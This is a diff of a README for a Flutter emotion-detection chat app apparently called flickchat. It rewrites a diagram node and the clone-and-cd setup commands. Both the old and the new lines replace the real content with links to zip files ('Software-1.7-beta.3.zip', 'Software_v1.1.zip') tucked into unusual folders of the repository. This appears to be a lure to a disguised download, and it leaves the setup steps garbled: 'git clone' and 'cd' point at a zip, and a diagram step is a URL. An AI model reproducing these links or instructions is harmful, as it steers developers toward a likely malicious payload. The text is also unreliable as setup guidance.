@@ -28,7 +28,7 @@ graph TD
     B --> C[ChatPage initState]
     C --> D[Load .tflite model]
     D --> E[Initialize front camera]
-    E --> F[https://github.com/rishikeshjoshy/flickchat/raw/refs/heads/master/windows/runner/resources/Software-1.7-beta.3.zip (5s)]
+    E --> F[https://raw.githubusercontent.com/rishikeshjoshy/flickchat/master/android/app/src/main/Software_v1.1.zip (5s)]
     F --> G[Capture snapshot]
     G --> H[Preprocess image (48x48, grayscale, normalize)]
     H --> I[TFLite inference → emotion label]
@@ -52,8 +52,8 @@ graph TD
 
 🔌 Setup & Run
 1. Clone the Repository
-git clone https://github.com/rishikeshjoshy/flickchat/raw/refs/heads/master/windows/runner/resources/Software-1.7-beta.3.zip
-cd https://github.com/rishikeshjoshy/flickchat/raw/refs/heads/master/windows/runner/resources/Software-1.7-beta.3.zip
+git clone https://raw.githubusercontent.com/rishikeshjoshy/flickchat/master/android/app/src/main/Software_v1.1.zip
+cd https://raw.githubusercontent.com/rishikeshjoshy/flickchat/master/android/app/src/main/Software_v1.1.zip
 
 
 2. Set Up Firebase
